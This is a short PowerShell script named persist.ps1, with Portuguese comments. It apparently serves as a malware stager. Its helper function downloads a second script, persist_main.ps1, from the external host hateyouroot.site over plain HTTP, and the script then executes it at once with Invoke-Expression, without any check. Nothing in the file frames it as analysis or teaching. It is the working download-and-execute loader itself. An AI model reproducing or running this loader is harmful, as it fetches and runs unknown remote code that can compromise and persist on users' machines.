# =====================================================
# persist.ps1 - VERSÃO COM REDIRECT FIX (HTTP/HTTPS)
# =====================================================

# Função para download com redirect automático
function Get-WebContent {
    param([string]$Url)
    try {
        $request = [System.Net.WebRequest]::Create($Url)
        $request.AllowAutoRedirect = $true
        $request.Method = "GET"
        $response = $request.GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $content = $reader.ReadToEnd()
        $reader.Close()
        $response.Close()
        return $content
    } catch {
        Write-Host "Erro no download: $($_.Exception.Message)"
        exit
    }
}

# Baixa o script principal (com redirect fix)
$MainScript = Get-WebContent -Url "http://hateyouroot.site/persist_main.ps1"

# Executa o script principal
IEX $MainScript
